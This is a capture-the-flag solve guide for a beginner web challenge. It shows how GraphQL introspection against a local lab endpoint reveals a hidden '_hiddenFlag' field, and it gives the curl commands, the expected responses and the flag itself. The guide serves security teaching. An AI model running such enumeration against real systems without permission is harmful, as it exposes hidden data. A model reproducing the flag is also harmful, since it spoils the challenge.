# [Easy] Web - Keep It on the QL - Solve Guide

## Overview
The target exposes a GraphQL API endpoint with introspection enabled. By querying the schema, hidden query fields can be discovered — including one that directly returns the flag.

## Initial Analysis
The challenge title "Keep It on the QL" is a direct hint toward GraphQL. The application presents a cyber-punk storefront with no obvious input vectors on the surface. The attack surface is the `/graphql` endpoint.

GraphQL APIs, when misconfigured, allow **introspection** — a built-in mechanism that lets clients query the schema itself to discover all available types, queries, mutations, and fields. This is intended for development tooling but is a significant information disclosure risk when left enabled in production.

## Enumeration / Inspection
Use GraphQL introspection to dump the available query fields from the schema:

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
```

**Expected response:**
```json
{
  "data": {
    "__schema": {
      "queryType": {
        "fields": [
          { "name": "_hiddenFlag" }
        ]
      }
    }
  }
}
```

This reveals a non-obvious query field: `_hiddenFlag`, which would not be discoverable through the application's UI.

## Method
- **Vulnerability:** GraphQL introspection enabled in production
- **Technique:** Schema enumeration via `__schema` introspection query, followed by direct invocation of an undocumented/hidden query field

## Exploitation / Decryption / Solution Steps

**Step 1 — Enumerate the GraphQL schema**

Query the schema to list all available query fields:

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
```

Review the response for any non-standard or suspicious field names. The field `_hiddenFlag` stands out as it is prefixed with an underscore, suggesting it is intentionally obscured from normal use.

**Step 2 — Query the hidden field**

Call the discovered field directly:

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ _hiddenFlag }"}'
```

**Expected response:**
```json
{
  "data": {
    "_hiddenFlag": "P2P{2958d7759266ed4b0922fb1df60b119a01f60639cab25a9bb3d74c1902e131c0}"
  }
}
```

**Flag:** `P2P{2958d7759266ed4b0922fb1df60b119a01f60639cab25a9bb3d74c1902e131c0}`

## Commands Used

```bash
# Step 1 - Introspection query to enumerate schema fields
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'

# Step 2 - Query the hidden flag field directly
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ _hiddenFlag }"}'
```

## Scripts Used
None — challenge is solvable with standard `curl` only.
